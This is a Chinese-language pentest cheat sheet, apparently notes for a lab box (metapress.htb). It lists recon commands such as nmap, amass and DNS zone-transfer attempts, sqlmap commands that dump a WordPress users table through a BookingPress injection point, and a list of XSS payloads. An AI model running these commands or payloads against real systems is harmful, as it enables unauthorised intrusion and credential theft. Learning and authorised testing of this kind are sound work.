## 收集情報
被動情報收集
- whois target.com：查詢網域註冊擁有者、DNS 伺服器與註冊商資訊。
- nslookup target.com：查詢目標網域的 IP 位址。
- dig target.com ANY：查詢該網域的所有 DNS 紀錄（A, AAAA, MX, TXT 等）。

主動情報收集
連接埠掃描與服務識別
- nmap -sV -sC -O -p- -T4 --min-rate 5000 [目標IP] -oN scan_result.txt
- arp-scan -l -> 掃描區域網路內所有設備的 MAC 與 IP 位址。
- nikto -host http://target.com/ -> 自動找常見 Web 漏洞

Web 資訊與路徑目錄強制爆破 -> 針對 Web 伺服器，收集網站架構、隱藏目錄、備份檔案及後台路徑。
- whatweb http://target.com：辨識網站使用的 CMS（如 WordPress）、網頁伺服器（Nginx/Apache）及 JavaScript 框架。
- dirb http://target.com：使用內建字典檔爆破網站的隱藏目錄與檔案。
- gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt：使用 Go 語言開發的高速目錄爆破工具，指定特定字典檔進行搜尋。

DNS 子網域爆破 -> 尋找目標企業可能遺忘或未受保護的子網域
- dnsrecon -d target.com -t axfr：嘗試進行 DNS 區域傳送（Zone Transfer）漏洞測試，若成功可直接獲取所有子網域。
- amass enum -d target.com：使用 OWASP Amass 工具，整合多種被動與主動技術爆破子網域。
- amass enum -passive -d target.com -o target_subdomains.txt -> 安全版
子網域清單（Subdomain List）您會抓到 target.com 底下所有活著（或曾經存在）的子網域，例如：vpn.target.com、stage.target.com、api-dev.target.com 等。
情報來源標籤（Sources）因為加上了 -src，每一個找到的子網域前面都會標註它是怎麼被發現的。例如：[Brute Force] mfa.target.com（代表是靠暴力破解字典猜到的）、[Crtsh] mail.target.com（代表是從憑證日誌中撈到的）。這對評估資產的「隱蔽性」非常有幫助。
網路拓撲架構（Network Topology）Amass 會自動解析這些子網域的 IP 位址、ASN（自治系統號）、以及所屬的網段（CIDR Block）。這能幫您理清目標企業是把服務託管在 AWS、GCP 還是自家機房。

## 漏洞利用
1. sqlmap
- sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=[your nonce]&category_id=33&total_service=1" -p total_service --dbs --batch
- sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=[your nonce]&category_id=33&total_service=1" -p total_service -D blog --tables --batch
- sqlmap -u "http://metapress.htb/wp-admin/admin-ajax.php" --data "action=bookingpress_front_get_category_services&_wpnonce=[your nonce]&category_id=33&total_service=1" -p total_service -D blog --T wp_users --dump --batch
- curl -s "http://metapress.htb" | grep -iE "nonce|bookingpress"

2. XSS -> 使用 BurpSuite 攔截封包
- <script>alert(1)</script>
- <script>alert(document.cookie)</script>
- <svg/onload=alert(1)>
- <img src=# onerror=alert(1)>
- <a href="javascript:alert(1)">g</a>
- <input type="text" value="g" onmouseover="alert(1)" />
- <iframe src="javascript:alert(1)"></iframe>

## 清除紀錄

## 撰寫報告
